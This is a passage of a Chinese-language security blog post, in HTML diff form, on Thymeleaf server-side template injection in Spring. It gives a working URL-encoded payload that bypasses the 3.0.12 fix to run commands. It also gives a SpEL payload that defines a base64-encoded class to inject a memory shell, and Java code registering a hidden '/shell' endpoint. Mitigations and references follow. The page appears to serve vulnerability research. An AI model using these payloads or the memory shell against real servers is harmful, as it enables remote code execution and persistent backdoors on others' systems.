+<li>不能在 <code>T</code> 和 <code>(</code> 中间添加的字符使得原表达式出现问题</li>
+</ol>
+<p>参考 <a target="_blank" rel="noopener" href="https://www.cnpanda.net/sec/1063.html">panda</a> 与 <a target="_blank" rel="noopener" href="https://github.com/thymeleaf/thymeleaf-spring/issues/256">threedr3am</a> 两位师傅的文章，可以通过在 <code>T</code>和 <code>(</code>中间插入空格、换行等字符进行绕过</p>
+<p>最后的 payload 可以如下</p>
+<pre class="language-text" data-language="text"><code class="language-text">;/__$%7BT%20(java.lang.Runtime).getRuntime().exec(%22calc%22)%7D__::.x
+//__$%7BT%20(java.lang.Runtime).getRuntime().exec(%22calc%22)%7D__::.x</code></pre>
+
+<h1 id="注入内存马"><a href="#注入内存马" class="headerlink" title="注入内存马"></a>注入内存马</h1><p>前文提到，Thymeleaf SSTI 最后其实是 SpEL 注入，所以是可以考虑利用 SpEL 来注入内存马提高漏洞的可用性</p>
+<p>这里参考 <a target="_blank" rel="noopener" href="https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/">Spring cloud gateway 通过 SPEL 注入内存马</a> 和 [[..&#x2F;01-Java&#x2F;Spring 动态注入 Controller#registerMapping]]，修改其中的payload</p>
+<pre class="language-text" data-language="text"><code class="language-text">T(org.springframework.cglib.core.ReflectUtils).defineClass("SpringRequestMappingMemshell",T(org.springframework.util.Base64Utils).decodeFromUrlSafeString("SpringRequestMappingMemshell.class的UrlSafebase64编码"),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT",0).getBean(T(Class).forName("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping")))</code></pre>
+
+<p><strong>注意这个自定义的内存马的包名问题，否则可能会导致加载字节码失败</strong></p>
+<p>这里使用 URL safe base64 编码是因为正常的 base64 编码结果中可能会包含 <code>/</code>，导致在使用 GET 请求提交 payload 时，web 容器错误的将 <code>/</code> 解析为路径关键字</p>
+<p>另外需要注意的是以上 payload 中用到了 <code>java.net.URL[0]</code>，其中的 <code>[</code> 和 <code>]</code> 等特殊字符，可能会导致 400，可以用 <code>java.net.URL(&quot;http&quot;,&quot;127.0.0.1&quot;,&quot;1.txt&quot;)</code> 进行替换</p>
+<p><code>doInject</code> 方法示例</p>
+<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringRequestMemShell</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">doInject</span><span class="token punctuation">(</span><span class="token class-name">Object</span> mapping<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">String</span> msg <span class="token operator">=</span> <span class="token string">"start inject"</span><span class="token punctuation">;</span>
+        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">Method</span> registerMapping <span class="token operator">=</span> mapping<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"registerMapping"</span><span class="token punctuation">,</span> <span class="token class-name">RequestMappingInfo</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Method</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            registerMapping<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">Method</span> serviceMethod <span class="token operator">=</span> <span class="token class-name">SpringRequestMemShell</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"service"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">PatternsRequestCondition</span> pattern <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PatternsRequestCondition</span><span class="token punctuation">(</span><span class="token string">"/shell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">RequestMethodsRequestCondition</span> methodsRequestCondition <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RequestMethodsRequestCondition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">RequestMappingInfo</span> requestMappingInfo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RequestMappingInfo</span><span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> methodsRequestCondition<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            registerMapping<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>mapping<span class="token punctuation">,</span> requestMappingInfo<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">SpringRequestMemShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> serviceMethod<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            msg <span class="token operator">=</span> <span class="token string">"inject success"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            msg <span class="token operator">=</span> <span class="token string">"inject failed"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><ul>
+<li><p>配置 ResponseBody 或 RestController 注解<br>  如果设置 <code>@ResponseBody</code> 或者 <code>@RestController</code>，则不再调用模板解析</p>
+</li>
+<li><p>设置 redirect 重定向<br>  根据 springboot 定义，如果名称以 redirect:开头，则不再调用 ThymeleafView 解析，调用 RedirectView 去解析 controller 的返回值</p>
+</li>
+<li><p>方法参数中设置 HttpServletResponse 参数</p>
+<p>由于 controller 的参数被设置为 HttpServletResponse，Spring 认为它已经处理了 HTTP Response，因此不会发生视图名称解析</p>
+</li>
+</ul>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254519">https://www.anquanke.com/post/id/254519</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10514">https://xz.aliyun.com/t/10514</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnpanda.net/sec/1063.html">https://www.cnpanda.net/sec/1063.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/thymeleaf/thymeleaf-spring/issues/256">https://github.com/thymeleaf/thymeleaf-spring/issues/256</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1332/">https://paper.seebug.org/1332/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11688">https://xz.aliyun.com/t/11688</a></p>
+<p><a target="_blank" rel="noopener" href="https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/">https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/</a></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/posts/c5577d2" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-10-04 15:29:58
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/SSTI/" title="SSTI">
+                        #SSTI
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/posts/f078a2fd" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Thymeleaf-%E5%9F%BA%E7%A1%80"><span class="toc-text">Thymeleaf 基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE"><span class="toc-text">标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-text">表达式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%87%E6%AE%B5%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-text">片段表达式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E5%A4%84%E7%90%86"><span class="toc-text">预处理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#templatename"><span class="toc-text">templatename</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URI-PATH"><span class="toc-text">URI PATH</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="toc-text">漏洞原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-0-12-%E7%9A%84%E4%BF%AE%E5%A4%8D%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="toc-text">3.0.12 的修复与绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E8%A7%86%E5%9B%BE%E5%90%8D%E7%A7%B0"><span class="toc-text">检查视图名称</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A6%81%E6%AD%A2-new-%E5%88%9B%E5%BB%BA%E7%B1%BB%E5%92%8C-T-%E5%88%9B%E5%BB%BA%E9%9D%99%E6%80%81%E7%B1%BB"><span class="toc-text">禁止 new 创建类和 T()创建静态类</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">注入内存马</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-text">修复方案</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/Zh0um1">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Thymeleaf%20SSTI + '&url=' + http%3A%2F%2Fzh0um1.github.io%2Fposts%2Fd8e592a0 + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://zh0um1.github.io/posts/d8e592a0" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
